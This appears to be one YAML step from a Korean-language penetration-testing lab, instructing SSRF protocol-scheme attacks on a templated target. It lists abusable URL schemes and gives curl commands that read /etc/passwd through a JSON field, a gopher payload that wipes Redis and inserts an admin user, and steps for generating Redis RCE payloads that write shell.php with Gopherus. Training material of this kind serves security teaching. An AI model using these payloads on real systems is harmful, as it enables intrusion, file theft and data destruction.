- order: 5
  instruction: |-
    {{WEB_IP}} 대상으로 프로토콜 스키마 변경 테스트를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 활용 가능 스키마 표
    | scheme | 활용 |
    |---|---|
    | `file://` | 로컬 파일 읽기 (`/etc/passwd`) |
    | `gopher://` | 임의 TCP 통신 (Redis/MySQL/SMTP attack) |
    | `dict://` | 정보 누출 (`dict://localhost:11211/stats`) |
    | `ldap://` | LDAP 쿼리 |
    | `tftp://` | TFTP 파일 |
    | `ssh2://` (PHP) | SSH 명령 |
    | `expect://` (PHP) | 명령 실행 |
    | `phar://` (PHP) | 역직렬화 RCE |

    ▶ 2단계: 도구 A — curl 으로 file:// 시도
    ```bash
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -d '{"profileImage":"file:///etc/passwd"}'
    # 응답에 root:x:0:0... 가 보이면 성공
    ```

    ▶ 3단계: 도구 B — gopher://로 Redis 공격 (가장 강력)
    ```bash
    # gopher 페이로드 생성: redis FLUSHALL + 새 admin 추가
    PAYLOAD=$(printf 'gopher://127.0.0.1:6379/_FLUSHALL%%0d%%0aSET %%22user:admin%%22 %%22{role:admin}%%22%%0d%%0aSAVE%%0d%%0a')
    curl "http://target/ssrf?url=$PAYLOAD"
    ```
    더 강력 — Redis 의 `CONFIG SET dir / dbfilename shell.php` 으로 RCE:
    ```bash
    # gopherus 도구로 Redis RCE 페이로드 자동 생성
    git clone https://github.com/tarunkant/Gopherus
    cd Gopherus && python2 gopherus.py --exploit redis
    # 또는 mysql / fastcgi / smtp 도 가능
    ```

